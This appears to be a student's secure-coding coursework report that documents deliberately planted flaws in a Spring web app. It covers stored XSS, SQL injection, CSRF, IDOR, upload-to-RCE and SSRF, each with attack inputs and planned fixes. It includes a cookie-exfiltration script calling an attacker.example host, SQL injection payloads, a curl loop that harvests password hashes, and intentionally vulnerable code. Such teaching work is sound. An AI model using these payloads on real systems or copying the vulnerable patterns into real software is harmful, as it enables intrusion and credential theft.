# CampusConnect — Vulnerable Application

**SIT218/SIT738 Secure Coding — Task 7.3HD, Task 1**

This document tracks the vulnerabilities demonstrated in `vulnerable-webapp`, one section per vulnerability, following the pattern: **feature built → normal functionality confirmed → vulnerability introduced → attack demonstrated → source code located.**

> **Evidence folder convention:** All screenshots referenced below live in ``. Filenames follow the pattern `T1-{vuln#}{letter}_{description}.png`. Update the image paths below if your repo structure differs.

---

## Table of Contents

- [6.3 — Stored XSS (Club Noticeboard)](#63--stored-xss-club-noticeboard)
- [6.4 — SQL Injection (Member Search)](#64--sql-injection-member-search)
- [6.5 — CSRF (Send Study Points)](#65--csrf-send-study-points)
- [4 — Data Aggregation / Broken Access Control (Member Profile)](#4--data-aggregation--broken-access-control-member-profile)
- [6.6 — Unrestricted File Upload (Photo Upload)](#66--unrestricted-file-upload-photo-upload)

---

## 6.3 — Stored XSS (Club Noticeboard)

### Objective
Demonstrate a stored cross-site scripting vulnerability in the Club Noticeboard feature.

### Location
| | |
|---|---|
| Vulnerable code | `src/main/resources/templates/noticeboard/index.html` (line ~40, `th:utext`) |
| Entry point | `src/main/java/com/campusconnect/controller/NoticeboardController.java`, `createPost()` |

### Vulnerable code

```html
<p th:utext="${post.content}">Content</p>
```

```java
@PostMapping
public String createPost(@RequestParam String authorUsername,
                          @RequestParam String content) {
    Post post = new Post(authorUsername, content);
    postRepository.save(post);
    return "redirect:/noticeboard";
}
```

### Why vulnerable
- `content` is taken directly from the HTTP request with **no server-side validation or sanitization**.
- It is saved to the database unmodified.
- When rendered, `th:utext` ("unescaped text") writes the string as raw HTML instead of Thymeleaf's safe default (`th:text`, which HTML-encodes `<`, `>`, `&`, etc.).
- Any HTML/JavaScript submitted by a user is therefore interpreted and executed by the browser of every subsequent visitor.

### Attack input
| Field | Value |
|---|---|
| Author | `attacker` |
| Message | `<script>alert("You have been hacked!");</script>` |

### Attack procedure
1. Submit the payload via the noticeboard form (`POST /noticeboard`).
2. Payload is stored in the `posts` table, byte-for-byte, unmodified.
3. Any user — including the attacker, and including future visitors — who loads `GET /noticeboard` triggers execution.

### Expected vs. actual result
| | |
|---|---|
| **Expected (secure) behaviour** | Message displays as literal text, script tag not executed |
| **Actual (vulnerable) result** | Browser executes the injected `<script>` tag; alert box fires |

### Security impact
Because this is **stored** (persistent), not reflected, the payload executes for *every* visitor to the noticeboard — not just the person who submitted it. In a real attack, `alert()` would be replaced with something like:
```html
<script>fetch('https://attacker.example/steal?c=' + document.cookie)</script>
```
silently exfiltrating session cookies from any member (including admins) who views the page, enabling session hijacking.

### Evidence

| Screenshot | Description |
|---|---|
| ![Baseline](T1-00_noticeboard_ui_baseline.png) | `T1-00` — Noticeboard UI baseline, empty state |
| ![Before baseline](T1-01a_xss_before_baseline.png) | `T1-01a` — Empty noticeboard before any posts |
| ![Normal post](T1-01b_xss_normal_post_result.png) | `T1-01b` — Legitimate `bob_smith` post displaying correctly (proves feature works before attack) |
| ![Payload input](T1-01b_xss_payload_input.png) | `T1-01c` — Malicious `<script>` payload entered into the form, pre-submit |
| ![Alert fired](T1-01d_xss_alert_fired.png) | `T1-01d` — JavaScript alert box firing, confirming execution |
| ![Page source](T1-01e_xss_page_source.png) | `T1-01e` — Raw HTTP response source showing the unescaped `<script>` tag |
| ![Vulnerable template](T1-01f_xss_vulnerable_template.png) | `T1-01f` — Source: `index.html`, `th:utext` line highlighted |
| ![Vulnerable controller](T1-01g_xss_vulnerable_controller.png) | `T1-01g` — Source: `NoticeboardController.java`, `createPost()` showing no input validation |

### Planned prevention (Task 3)
Replace `th:utext` with `th:text` (Thymeleaf's default HTML-escaping behaviour), combined with server-side input validation via Spring's Hibernate Validator.

---

## 6.4 — SQL Injection (Member Search)

### Objective
Demonstrate a SQL Injection vulnerability in the "Find a Member" search feature.

### Location
| | |
|---|---|
| Vulnerable code | `src/main/java/com/campusconnect/service/MemberSearchService.java`, `vulnerableSearchByUsername()` |
| Entry point | `src/main/java/com/campusconnect/controller/MemberController.java`, `search()` |
| Safe method kept for comparison | `src/main/java/com/campusconnect/repository/MemberRepository.java`, `findByUsername()` (parameterized, Task 3 will restore this) |

### Vulnerable code

```java
@SuppressWarnings("unchecked")
public List<Member> vulnerableSearchByUsername(String username) {
    String sql = "SELECT * FROM members WHERE username = '" + username + "'";
    Query query = entityManager.createNativeQuery(sql, Member.class);
    return query.getResultList();
}
```

```java
@GetMapping("/results")
public String search(@RequestParam(required = false) String username, Model model) {
    if (username != null && !username.isBlank()) {
        List<Member> results = memberSearchService.vulnerableSearchByUsername(username);
        model.addAttribute("results", results);
        model.addAttribute("searchedUsername", username);
    }
    return "members/search";
}
```

### Why vulnerable
User-supplied `username` is concatenated directly into a native SQL string with **no parameterization, escaping, or validation**. Any SQL metacharacters in the input (quotes, boolean operators, comment syntax) are interpreted as part of the query itself rather than as literal search text.

> **Note:** Spring Data JPA's `@Query` annotation is resistant to injection by design — it still parameterizes under the hood even with a raw SQL string. A genuinely exploitable query requires dropping to a raw `EntityManager` native query built via string concatenation, as shown above. This is realistic: it mirrors a common real-world mistake of dropping to raw SQL "for flexibility."

### Attack inputs

| Payload | Purpose |
|---|---|
| `' OR '1'='1` | Full boolean bypass — dumps every row |
| `admin'#` | Targeted extraction — returns exactly the `admin` record |

### Attack breakdown — boolean bypass

Query template:
```sql
SELECT * FROM members WHERE username = '<user input>'
```
With input `' OR '1'='1`:
```sql
SELECT * FROM members WHERE username = '' OR '1'='1'
```
- The attacker's `'` closes the string literal early.
- `OR '1'='1'` is a condition that is always `TRUE`.
- `TRUE OR anything` evaluates to `TRUE` for every row → the `WHERE` clause matches the entire table.

### Attack breakdown — targeted extraction

With input `admin'#`:
```sql
SELECT * FROM members WHERE username = 'admin'#'
```
`#` is MariaDB's single-line comment marker — everything after it (including the trailing quote the application appended) is ignored. This returns exactly the `admin` row, as if the attacker had queried for it directly.

> **Note on comment syntax:** MariaDB's `--` comment style requires a trailing space to register; without it, a syntax error occurs (`... near '''`). `#` requires no trailing whitespace, making it more reliable when passed through HTML forms/URL encoding, where trailing spaces are easily dropped. This was confirmed during testing — see the failed-attempt evidence below.

### Expected vs. actual result
| | |
|---|---|
| **Expected (normal input)** | Zero or one matching member returned |
| **Actual (`' OR '1'='1`)** | All 5 seeded members returned, including `admin` |
| **Actual (`admin'#`)** | Exactly one result — the `admin` record, extracted in isolation |

### Security impact
An attacker can enumerate the entire user base — including the `admin` account — with **no authentication required**. The same technique could be extended (e.g. via `UNION SELECT`) to extract data from other tables entirely, or, depending on database permissions, to modify or delete data.

### Evidence

| Screenshot | Description |
|---|---|
| ![Search baseline](T1-02a_search_baseline.png) | `T1-02a` — Empty search form |
| ![Valid search](T1-02b_search_valid_result.png) | `T1-02b` — Valid search (`alice_wong`), one clean result |
| ![No result](T1-02c_search_no_result.png) | `T1-02c` — Search for non-existent username, "not found" message |
| ![Still works](T1-02d_search_still_works_normally.png) | `T1-02d` — Normal search still functions correctly after vulnerable code introduced |
| ![Payload input](T1-02e_sqli_payload_input.png) | `T1-02e` — `' OR '1'='1` entered into the search box |
| ![All dumped](T1-02f_sqli_all_members_dumped.png) | `T1-02f` — All 5 members returned, warning banner visible |
| ![Targeted bypass](T1-02g_sqli_targeted_admin_bypass.png) | `T1-02g` — `admin'#` returning exactly the admin record |
| ![Console log](T1-02h_sqli_console_log.png) | `T1-02h` — Eclipse console showing the raw injected SQL executed by MariaDB |
| ![Vulnerable service](T1-02i_sqli_vulnerable_service.png) | `T1-02i` — Source: `MemberSearchService.java`, concatenation line highlighted |
| ![Vulnerable controller](T1-02j_sqli_vulnerable_controller.png) | `T1-02j` — Source: `MemberController.java`, `search()` calling the vulnerable service |

### Planned prevention (Task 3)
Replace the native concatenated query with Hibernate ORM's parameterized derived query method (`findByUsername`, already present in `MemberRepository` for direct before/after comparison), or an HQL query using named parameters.

---

## 6.5 — CSRF (Send Study Points)

### Objective
Demonstrate a Cross-Site Request Forgery vulnerability in the "Send Study Points" feature.

### Location
| | |
|---|---|
| Vulnerable code | `src/main/java/com/campusconnect/controller/StudyPointsController.java`, `send()` method (`POST /study-points/send`) |
| Attacker artifact | `csrf-attack/attacker.html` (hosted separately, simulating a malicious third-party site) |

### Vulnerable code

```java
// VULNERABLE: no CSRF token, no origin/referrer check.
// Relies purely on the session cookie automatically sent by the browser.
@PostMapping("/send")
public String send(@RequestParam String toUsername,
                    @RequestParam int amount,
                    HttpSession session) {
    String currentUser = (String) session.getAttribute("currentUser");
    if (currentUser == null) {
        return "redirect:/login";
    }
    studyPointService.sendPoints(currentUser, toUsername, amount);
    return "redirect:/study-points";
}
```

### Why vulnerable
The endpoint authorizes a state-changing action (a point transfer) based purely on the presence of a valid session cookie. There is no CSRF token binding the request to a legitimate form render, and no verification of the `Origin`/`Referer` header. Any page the victim's browser visits — while their CampusConnect session remains active — can silently trigger this same request.

### Attack scenario
1. Victim logs into CampusConnect normally (session cookie established)
2. Without logging out, victim visits an attacker-controlled page
3. That page contains a hidden, auto-submitting form targeting `/study-points/send`
4. Browser automatically attaches the victim's session cookie to the forged request
5. CampusConnect cannot distinguish this from a legitimate request

### Expected vs. actual result
| | |
|---|---|
| **Expected (secure) behaviour** | Request rejected — no valid CSRF token / origin mismatch |
| **Actual (vulnerable) result** | Victim's balance dropped from 40 to -460 points; an unauthorized `carla_nguyen → bob_smith: 500 points` transaction appeared in the log, despite Carla never clicking "Send Points" on the real form — she only clicked a "Claim Your Prize!" button on an unrelated page at `localhost:9000`. Confirmed via browser DevTools: the forged `POST /vulnerable-webapp/study-points/send` request, originating from the attacker page, returned `302` and was processed identically to a legitimate request. |

### Security impact
An attacker can transfer study points out of any logged-in victim's account without their knowledge or consent, simply by getting them to visit a page (or click something innocuous-looking on it) while their CampusConnect session is active — no phishing of credentials required, since the victim never interacts with CampusConnect directly during the attack.

> **Secondary observation (not the focus of this vulnerability, worth a brief mention):** the app also has no validation preventing a transfer from driving a sender's balance negative — Carla's balance reached -460 with no rejection. A minor input-validation gap alongside the main CSRF issue.

### Evidence

| Screenshot | Description |
|---|---|
| ![Login dropdown](T1-03a_studypoints_login.png) | `T1-03a` — "Act as" login dropdown, no password required |
| ![Baseline](T1-03b_studypoints_baseline.png) | `T1-03b` — Study points page after logging in as Carla (40 points, no transactions) |
| ![Normal transfer](T1-03c_studypoints_normal_transfer.png) | `T1-03c` — Legitimate transfer of 10 points to Alice, balance and transaction updating correctly |
| ![Attacker page](T1-03d_csrf_attacker_page.png) | `T1-03d` — Disguised "Free Giveaway" attacker page at `localhost:9000`, hosted on a different origin |
| ![Victim before](T1-03e_csrf_victim_before.png) | `T1-03e` — Carla's balance immediately before visiting the attacker page |
| ![Victim after](T1-03f_csrf_victim_after.png) | `T1-03f` — Carla's balance after clicking the disguised button — unauthorized 500-point transfer to `bob_smith`, balance now -460 |
| ![Network evidence](T1-03g_csrf_network_evidence.png) | `T1-03g` — Browser DevTools Network tab showing the forged cross-origin `POST /study-points/send` succeeding with a `302` response |
| ![Vulnerable controller](T1-03h_csrf_vulnerable_controller.png) | `T1-03h` — Source: `StudyPointsController.java`, `/send` endpoint with no CSRF token or origin check |
| ![Attacker source](T1-03i_csrf_attacker_html_source.png) | `T1-03i` — Source: `attacker.html`, the hidden auto-fillable form and disguised trigger button |

### Planned prevention (Task 3)
Per the brief: CSRF token-based protection combined with the `HttpSession` ID (`JSESSIONID`), plus Referrer header validation — explicitly **not** Spring Security's built-in CSRF protection, which is reserved for Task 4.

---
## 4 — Data Aggregation / Broken Access Control (Member Profile)

### Objective
Demonstrate an Insecure Direct Object Reference (IDOR) combined with excessive data exposure in the Member Profile feature.

### Location
| | |
|---|---|
| Vulnerable code | `src/main/resources/templates/profile/view.html` (lines ~27–37, unconditional field rendering) |
| Entry point | `src/main/java/com/campusconnect/controller/ProfileController.java`, `viewProfile()` |

### Vulnerable code

```java
@GetMapping("/profile")
public String viewProfile(@RequestParam Long id, Model model) {
    Member member = memberRepository.findById(id).orElse(null);
    model.addAttribute("member", member);
    model.addAttribute("requestedId", id);
    return "profile/view";
}
```

```html
<!-- VULNERABLE: exposes every field on the entity, including
     internal/sensitive data no "public profile" view should show -->
<div th:if="${member != null}" class="post">
    <p><strong>ID:</strong> <span th:text="${member.id}"></span></p>
    <p><strong>Username:</strong> <span th:text="${member.username}"></span></p>
    <p><strong>Full name:</strong> <span th:text="${member.fullName}"></span></p>
    <p><strong>Email:</strong> <span th:text="${member.email}"></span></p>
    <p><strong>Phone:</strong> <span th:text="${member.phone} ?: 'Not provided'"></span></p>
    <p><strong>Role:</strong> <span th:text="${member.role}"></span></p>
    <p><strong>Study Points:</strong> <span th:text="${member.studyPoints}"></span></p>
    <p><strong>Password Hash:</strong> <span th:text="${member.passwordHash}"></span></p>
</div>
```

### Why vulnerable
- `viewProfile()` takes an arbitrary `id` request parameter and passes it straight to `memberRepository.findById(id)` with **no authentication check and no ownership/authorization check** — there is no verification that a session exists, let alone that the requester is entitled to view that particular record.
- The template renders **every field** on the `Member` entity unconditionally, including internal/sensitive data — role, exact study point balance, and even the **password hash** — that a "public profile" view has no legitimate reason to expose to anyone, owner or not.
- Together this is a textbook **IDOR** (OWASP A01:2021 — Broken Access Control) layered with **excessive data exposure**: even a properly authenticated, ordinary member could walk the `id` parameter and pull every other member's private data with no injection or exploit technique required at all — just incrementing a number in the URL.

### Attack input
| Parameter | Values used |
|---|---|
| `id` | `1`, `2`, `3`, `4`, `5` (all seeded members, no session/login) |

### Attack procedure
1. Visit `GET /vulnerable-webapp/profile?id=1` with **no login** — full record for `alice_wong` returned, including password hash, role, and study points.
2. Manually increment `id` through `2`–`5` — each request returns a different member's complete record, unauthenticated.
3. Automate the walk with a bash loop piping each response through `curl` and `grep`, extracting the `Password Hash` field for all five members in a single unauthenticated pass — demonstrating trivial bulk harvesting rather than a one-off manual look.

```bash
for id in 1 2 3 4 5; do
  echo "--- Member ID $id ---"
  curl -s "http://localhost:8080/vulnerable-webapp/profile?id=$id" | grep -A1 "Password Hash"
done
```

### Expected vs. actual result
| | |
|---|---|
| **Expected (secure) behaviour** | Profile only accessible to the authenticated owner (or an ADMIN), with sensitive fields (password hash, role, exact points) hidden from the rendered view entirely |
| **Actual (vulnerable) result** | Any anonymous visitor can view any member's full record — including password hash, role, and exact study point balance — for all 5 seeded IDs, with zero authentication |

### Security impact
An attacker can enumerate the entire member table from an unauthenticated position, harvesting password hashes (enabling offline cracking or credential-stuffing attempts), roles (identifying which accounts are ADMIN and therefore high-value targets), and exact point balances (a business-logic-sensitive value). Combined with simple sequential-ID enumeration, this amounts to a full, unauthenticated data dump of the member table — functionally similar in outcome to the SQL Injection vulnerability in Feature 2, but requiring no injection technique at all, only incrementing a URL parameter.

### Evidence

| Screenshot | Description |
|---|---|
| ![Normal view](T1-04a_profile_normal_view.png) | `T1-04a` — Baseline profile view confirming the feature renders correctly |
| ![ID 1 — Alice](T1-04b_profile_id1_alice.png) | `T1-04b` — `id=1`, unauthenticated, full record for `alice_wong` (ADMIN) including password hash |
| ![ID 2 — Bob](T1-04c_profile_id2_bob.png) | `T1-04c` — `id=2`, `bob_smith` (CLUB_LEADER) record returned by simply changing the URL |
| ![ID 3 — Carla](T1-04d_profile_id3_carla.png) | `T1-04d` — `id=3`, `carla_nguyen` record, including her (negative) study point balance |
| ![ID 4 — David](T1-04e_profile_id4_david.png) | `T1-04e` — `id=4`, `david_patel` record, confirming the NULL-phone edge case still renders (`Not provided`) |
| ![ID 5 — Admin](T1-04f_profile_id5_admin.png) | `T1-04f` — `id=5`, `admin` (ADMIN) record fully exposed |
| ![Curl automation](T1-04h_aggregation_curl_automation.png) | `T1-04h` — Bash/curl loop extracting all 5 password hashes unauthenticated in a single automated pass |
| ![Vulnerable controller](T1-04i_vulnerable_controller.png) | `T1-04i` — Source: `ProfileController.java`, `viewProfile()` showing no auth/ownership check |
| ![Vulnerable template](T1-04j_vulnerable_template.png) | `T1-04j` — Source: `view.html`, unconditional field rendering including `passwordHash` |

### Planned prevention (Task 3)
Add a server-side ownership/role check (requested `id` must match the session's `currentUser`, or the session role must be `ADMIN`); replace sequential numeric IDs with non-guessable identifiers (UUIDs) or an indirect reference map; and restrict the fields rendered to a "public profile" DTO/projection that excludes `passwordHash`, `role`, and exact `studyPoints` for non-owner viewers.
---

## 6.6 — Unrestricted File Upload (Photo Upload)

### Objective
Demonstrate an unrestricted file upload vulnerability in the profile photo / event flyer upload feature, leading to remote code execution.

### Location
| | |
|---|---|
| Vulnerable code | `src/main/java/com/campusconnect/controller/UploadController.java`, `handleUpload()` |
| Entry point | `src/main/resources/templates/upload/index.html`, upload form |

### Vulnerable code

```java
@Controller
public class UploadController {

    private static final String UPLOAD_DIR =
            "/home/kali/SIT218/eclipse-workspace/vulnerable-webapp/target/vulnerable-webapp/uploads/";

    @GetMapping("/upload")
    public String uploadForm(Model model) {
        File dir = new File(UPLOAD_DIR);
        String[] files = dir.exists() ? dir.list() : new String[0];
        model.addAttribute("files", files);
        return "upload/index";
    }

    @PostMapping("/upload")
    public String handleUpload(@RequestParam("file") MultipartFile file, Model model) throws IOException {
        if (!file.isEmpty()) {
            File dir = new File(UPLOAD_DIR);
            if (!dir.exists()) dir.mkdirs();

            Path filePath = Paths.get(UPLOAD_DIR, file.getOriginalFilename());
            file.transferTo(filePath);
        }
        return "redirect:/upload";
    }
}
```

```html
<form th:action="@{/upload}" method="post" enctype="multipart/form-data">
    <label>Choose file</label>
    <input type="file" name="file">
    <button type="submit">Upload</button>
</form>
```

### Why vulnerable
- `handleUpload()` performs **no validation whatsoever** on the uploaded file: no extension allow-list, no MIME/content-type check, and no inspection of the actual file bytes (magic-number sniffing) to confirm it is really an image.
- `file.getOriginalFilename()` — a value fully controlled by the attacker's browser — is passed straight into `Paths.get()` and used as the on-disk filename with no sanitization. This is a secondary weakness (path traversal via `../` sequences in the filename) sitting alongside the primary one, though not the technique demonstrated below.
- Critically, `UPLOAD_DIR` points **inside the deployed Tomcat webapp directory** (`target/vulnerable-webapp/uploads/`) — a location the servlet container actively serves and, because it ends in `.jsp`, will **compile and execute** rather than just return as a static file. Storing uploads inside a JSP-servable path is what turns "arbitrary file upload" into "arbitrary code execution."
- The HTML form has no `accept` attribute either, but that's a client-side nicety the attacker simply ignores — the real gap is server-side.

### Attack input
`proof.jsp`, uploaded in place of an image:
```jsp
<html>
<body>
<h2>Unrestricted File Upload — Proof of Concept</h2>
<p>This is a JSP file, not an image, and it was accepted and executed by the server.</p>
<p>Server info: <%= application.getServerInfo() %></p>
<p>Current date on server: <%= new java.util.Date() %></p>
</body>
</html>
```

### Attack procedure
1. Confirm normal functionality first: upload a legitimate `.jpg` (`aaron-burden-...jpg`) — it's accepted, listed under "Uploaded Files," and renders correctly at `/vulnerable-webapp/uploads/aaron-burden-...jpg`.
2. Select `proof.jsp` in the same upload form instead of an image file. Nothing in the client or server rejects it.
3. Submit. `proof.jsp` is accepted and appears in the "Uploaded Files" list right alongside the legitimate image — server-side, it was treated identically to the `.jpg`.
4. Navigate directly to `http://localhost:8080/vulnerable-webapp/uploads/proof.jsp`. Rather than downloading the file or returning an error, Tomcat **compiles and executes** it as a JSP page, and the scriptlet output (`application.getServerInfo()`, live server date) renders in the browser — proof the server ran attacker-supplied Java code, not just stored an attacker-supplied file.

### Expected vs. actual result
| | |
|---|---|
| **Expected (secure) behaviour** | Upload rejected (wrong extension/content-type/magic bytes), or if accepted, stored outside any JSP-servable path with a server-generated filename so it can never be requested as executable code |
| **Actual (vulnerable) result** | `proof.jsp` accepted with no checks, saved under its original filename inside the live webapp deployment directory, and executed on request — full server-side script execution, evidenced by `Server info: Apache Tomcat/10.1.59` and the live server date being printed back |

### Security impact
This is the most severe vulnerability demonstrated so far: **remote code execution**, not just data exposure or session abuse. `proof.jsp` only prints diagnostic text, but nothing stops a real attacker from embedding `Runtime.getRuntime().exec(...)` (or a full JSP web shell) in the scriptlet — giving them arbitrary command execution with whatever OS privileges the Tomcat process runs as. From there, an attacker could read the filesystem (including the app's DB credentials in configuration), pivot into `campusconnect_db` directly, plant a persistent backdoor, or use the box as a foothold into the rest of the network. Where SQLi and Data Aggregation exposed the database and CSRF/XSS abused a victim's session, this vulnerability hands over the **server itself**.

### Evidence

| Screenshot | Description |
|---|---|
| ![Baseline](T1-05a_upload_baseline.png) | `T1-05a` — Upload page baseline, no files uploaded yet |
| ![Normal upload](T1-05b_upload_normal_image.png) | `T1-05b` — Legitimate `.jpg` uploaded successfully, proving normal functionality |
| ![Normal image fetched](T1-05c_upload_normal_image_being_fetched.png) | `T1-05c` — The uploaded image rendering correctly at `/uploads/...` |
| ![Malicious file selected](T1-05c_upload_malicious_file_selected.png) | `T1-05c` — `proof.jsp` selected in the file picker, pre-submit, no client-side restriction |
| ![Malicious file accepted](T1-05d_upload_malicious_accepted.png) | `T1-05d` — `proof.jsp` listed under "Uploaded Files" next to the legitimate image — accepted with zero validation |
| ![Malicious file executed](T1-05d_upload_malicious_accepted-output.png) | `T1-05d` — Navigating to `/uploads/proof.jsp` directly: Tomcat executes it, printing server info and live date — confirms RCE, not just file storage |
| ![Vulnerable controller](T1-05g_upload_vulnerable_controller.png) | `T1-05g` — Source: `UploadController.java`, `handleUpload()` showing no extension/content-type/magic-byte validation |
| ![Vulnerable template](T1-05h_upload_vulnerable_template.png) | `T1-05h` — Source: `upload/index.html`, plain file input with no `accept` restriction |

### Planned prevention (Task 3)
Validate uploads against a strict image allow-list checked **server-side** by actual content (e.g. `ImageIO.read()` succeeding, or magic-byte/MIME sniffing via Apache Tika) rather than the client-supplied filename or `Content-Type` header; rename every accepted file server-side to a generated UUID so the attacker never controls the stored filename or extension; move the upload directory **outside** the deployed webapp path (or disable JSP/servlet execution on that directory at the Tomcat context level); and enforce a maximum file size.

---
## 6.7 — SSRF (Link Preview)

### Objective
Demonstrate a Server-Side Request Forgery vulnerability in the Link Preview feature.

### Location
- Vulnerable code: `src/main/java/com/campusconnect/controller/LinkPreviewController.java`, `fetchPreview()`
- Target: `src/main/java/com/campusconnect/controller/InternalAdminController.java`, `/internal/admin/status` (unlinked in the UI)

### Vulnerable code
```java
@GetMapping("/link-preview/fetch")
public String fetchPreview(@RequestParam String url, Model model) {
    model.addAttribute("submittedUrl", url);
    try {
        String body = restTemplate.getForObject(url, String.class);
        model.addAttribute("previewContent", body);
    } catch (Exception e) {
        model.addAttribute("error", e.getMessage());
    }
    return "linkpreview/index";
}
```

### Why vulnerable
`fetchPreview()` passes the user-supplied `url` parameter directly to `RestTemplate.getForObject()`
with no allow-list of hosts/domains, no block on loopback or private IP ranges, and no restriction
on port. The raw response body is reflected back to the requester unmodified. The application server
itself performs the request, borrowing the server's own network position and trust — not the
victim's browser or session.

### Attack input
`http://localhost:8080/vulnerable-webapp/internal/admin/status`

### Attack procedure
1. Confirm normal functionality: preview a real external URL, e.g. `https://example.com`.
2. Submit the internal admin URL through the same field instead.
3. The server fetches it server-side and reflects the response back — DB URL, DB user, and
   an internal admin API key, from a page with no link anywhere in the application.

### Expected vs. actual result
| | |
|---|---|
| **Expected (secure) behaviour** | Request rejected — target host not on an allow-list, or loopback/private ranges blocked outright |
| **Actual (vulnerable) result** | Internal admin data returned to the requester through the "preview," with no restriction on target host or port |

### Security impact
An attacker can use the application server as a proxy into its own internal surface — reaching
endpoints, services, and ports that were never intended to be reachable from outside, purely
because the fetch feature trusts whatever URL it's given. Beyond the one demonstrated endpoint,
the same technique can be used to fingerprint open vs. closed ports on the host by comparing
error messages (see optional evidence T1-06h/i), turning a "link preview" feature into an
internal network scanner.

### Evidence
T1-06a through T1-06g (see evidence folder); T1-06h/i optional bonus evidence.

### Planned prevention (Task 3)
Validate the target URL against a strict allow-list of permitted schemes/hosts before fetching;
explicitly reject loopback addresses (`localhost`, `127.0.0.1`, `::1`) and private IP ranges
(`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`); resolve DNS server-side and check the resolved
IP (not just the hostname string) against that block-list to prevent DNS-rebinding bypasses; and
avoid reflecting the raw response body back to the requester.

## Evidence Checklist (Task 1)

| ID | Vulnerability | Vulnerable code demonstrated | Attack demonstrated | Source location documented | Status |
|---|---|---|---|---|---|
| T1-01 | Stored XSS | ✅ | ✅ | ✅ | Complete |
| T1-02 | SQL Injection | ✅ | ✅ | ✅ | Complete |
| T1-03 | CSRF | ✅ | ✅ | ✅ | Complete |
| T1-04 | Data Aggregation | ✅ | ✅ | ✅ | Complete |
| T1-05 | Unrestricted File Upload | ✅ | ✅ | ✅ | Complete |
| T1-06 | SSRF (SIT738) | ✅ | ✅ | ✅ | Complete |